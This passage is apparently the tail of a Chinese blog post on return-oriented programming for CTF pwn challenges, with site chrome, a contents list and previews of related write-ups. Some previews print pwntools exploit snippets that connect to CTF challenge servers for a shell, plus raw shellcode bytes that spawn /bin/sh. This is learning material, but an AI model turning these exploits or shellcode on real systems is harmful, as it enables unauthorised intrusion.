class="line">p.sendline(str(length))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="中级ROP"><a href="#中级ROP" class="headerlink" title="中级ROP"></a>中级ROP</h1></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">Star</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/10/05/CTF-wiki/">http://example.com/2025/10/05/CTF-wiki/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><div class="post-share"><div class="social-share" data-image="/img/1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/10/04/CTF-2025/" title="?CTF_2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">?CTF_2025</div></div><div class="info-2"><div class="info-item-1">ncncnc一道nc连接的题目，首先使用cat hint </div></div></div></a><a class="pagination-related" href="/2025/10/07/shellcode%E8%AE%B0%E5%BD%95/" title="shellcode记录"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">shellcode记录</div></div><div class="info-2"><div class="info-item-1">做了一些shellcode的题目了，遇到了多种多样的shellcode，在这里记录一些，方便以后直接使用。（当然能够自己编写更好） 32位shellcraft生成的shellcodeshellcraft.sh()b&#x27;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#x27;#长度：44    能直接获取shell  64位shellcraft生成的shellcodeshellcraft.sh()b&#x27;jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;#长度：48   ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/08/23/0xGame2024-%E5%A4%8D%E7%8E%B0/" title="0xGame2024-复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-23</div><div class="info-item-2">0xGame2024-复现</div></div><div class="info-2"><div class="info-item-1">where_is_my_binsh  一道简单的题目，存在栈溢出以及system函数，没有&#x2F;bin&#x2F;sh\x00字符串，给了变量something的地址，那么就先输入&#x2F;bin&#x2F;sh\x00字符串再打ret2text。 from pwn import*io=remote(&#x27;gz.imxbt.cn&#x27;,20884)elf=ELF(&#x27;./where_is_my_binsh&#x27;)bin_sh=0x0404090system=elf.sym[&#x27;system&#x27;]ret=0x040101ardi=0x0401323io.sendlineafter(&#x27;If you want it ,then you have to create...</div></div></div></a><a class="pagination-related" href="/2025/08/03/2025-SWPU-NSSCTF-%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%AE%AD%E7%BB%83%E8%B5%9B/" title="2025_SWPU_NSSCTF_秋季招新训练赛"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-03</div><div class="info-item-2">2025_SWPU_NSSCTF_秋季招新训练赛</div></div><div class="info-2"><div class="info-item-1">口算题卡一道计算题，主要考察脚本的编写，但因为没有时间限制，所以可以直接算100道题。 from pwn import*s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)r = lambda n=None: io.recv(n)ra = lambda t=tube.forever: io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()rls = lambda n=2**20: io.recvlines(n)su = lambda buf,addr: io.success(buf + &quot;==&gt;&quot; + hex(addr))io =...</div></div></div></a><a class="pagination-related" href="/2025/09/06/NewStarCTF2024/" title="NewStarCTF2024"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-06</div><div class="info-item-2">NewStarCTF2024</div></div><div class="info-2"><div class="info-item-1">Game 就是不断输入1至9的数字，当输入的数字的和大于999时获得shell。 from pwn import*io=remote(&#x27;61.139.2.1&#x27;,57621)for _ in range(120):    io.sendline(b&#x27;9&#x27;)io.interactive()  Real_Login简单的签到题目，输入的字符串与程序设定的password一样就能获得shell。 from pwn import*io=remote(&#x27;61.139.2.1&#x27;,59414)io.sendlineafter(&#x27;your input: &#x27;,b&#x27;NewStar!!!&#x27;)io.interactive()  gdb 该程序先对字符串进行加密，用户再输入字符串并进行对比，若一致则获得flag。 使用gdb进行调试。  from pwn import*io=remote(&#x27;61.139.2.1&#x27;,63397)io.sendlineafter(&#x27;data:...</div></div></div></a><a class="pagination-related" href="/2025/10/04/CTF-2025/" title="?CTF_2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-04</div><div class="info-item-2">?CTF_2025</div></div><div class="info-2"><div class="info-item-1">ncncnc一道nc连接的题目，首先使用cat hint </div></div></div></a><a class="pagination-related" href="/2025/08/24/ISCTF2023/" title="ISCTF2023"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-24</div><div class="info-item-2">ISCTF2023</div></div><div class="info-2"><div class="info-item-1">stack一道不错的题目，让我对pwndbg的使用进一步的熟练   程序代码很简单，自定义输入字符串长度，通过循环不断输入，那么可以造成栈溢出，并且存在后门函数。但是此题的关键在于变量i会被覆盖，那么就会导致程序根据i将我们输入的东西写入到另一个地方。  因此，我们可以找准i的偏移，防止其被覆盖，我们就可以正常栈溢出到返回地址。 from pwn import*io=remote(&#x27;challenge.imxbt.cn&#x27;,20197)#io=process(&#x27;./stack&#x27;)ret=0x040101abackdoor=0x4012E6def debug():    gdb.attach(io)   ...</div></div></div></a><a class="pagination-related" href="/2025/08/31/GeekChallenge2024/" title="GeekChallenge2024"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-31</div><div class="info-item-2">GeekChallenge2024</div></div><div class="info-2"><div class="info-item-1">ez_shellcode简单的shellcode from pwn import*context.arch=&#x27;amd64&#x27;io=remote(&#x27;nc1.ctfplus.cn&#x27;,39373)shellcode_addr=0x0401256shellcode=asm(shellcraft.sh())io.send(shellcode)payload=cyclic(0x18+8)+p64(shellcode_addr)io.sendline(payload)io.interactive()  你会栈溢出吗？简单的64位栈溢出，注意堆栈平衡 from pwn...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Star</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/star492?tab=repositories"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/star492?tab=repositories" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E6%9C%ACROP"><span class="toc-text">基本ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2text"><span class="toc-text">ret2text</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-text">例子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode"><span class="toc-text">ret2shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90-1"><span class="toc-text">例子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sniperoj-pwn100-shellcode-x86-64"><span class="toc-text">sniperoj-pwn100-shellcode-x86-64</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2syscall"><span class="toc-text">ret2syscall</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90-2"><span class="toc-text">例子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-3"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc"><span class="toc-text">ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E2%80%94%E2%80%94%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A"><span class="toc-text">知识点——延迟绑定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B1"><span class="toc-text">例1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B1%E7%9A%84exp"><span class="toc-text">例1的exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B2"><span class="toc-text">例2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B2%E7%9A%84exp"><span class="toc-text">例2的exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B3"><span class="toc-text">例3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B3%E7%9A%84exp"><span class="toc-text">例3的exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#train-cs-nctu-edu-tw-ret2libc"><span class="toc-text">train.cs.nctu.edu.tw:ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-4"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ropasaurusrex"><span class="toc-text">ropasaurusrex</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-5"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#r0pbaby"><span class="toc-text">r0pbaby</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-3"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-6"><span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%AD%E7%BA%A7ROP"><span class="toc-text">中级ROP</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/08/pwn-test/" title="pwn_test">pwn_test</a><time datetime="2025-10-08T06:09:44.947Z" title="Created 2025-10-08 14:09:44">2025-10-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/07/shellcode%E8%AE%B0%E5%BD%95/" title="shellcode记录">shellcode记录</a><time datetime="2025-10-07T02:40:54.628Z" title="Created 2025-10-07 10:40:54">2025-10-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/05/CTF-wiki/" title="CTF_wiki">CTF_wiki</a><time datetime="2025-10-05T02:54:23.983Z" title="Created 2025-10-05 10:54:23">2025-10-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/04/CTF-2025/" title="?CTF_2025">?CTF_2025</a><time datetime="2025-10-04T05:13:29.590Z" title="Created 2025-10-04 13:13:29">2025-10-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/27/XYCTF2024/" title="XYCTF2024">XYCTF2024</a><time datetime="2025-09-27T04:01:30.614Z" title="Created 2025-09-27 12:01:30">2025-09-27</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/1.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2025 By Star</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
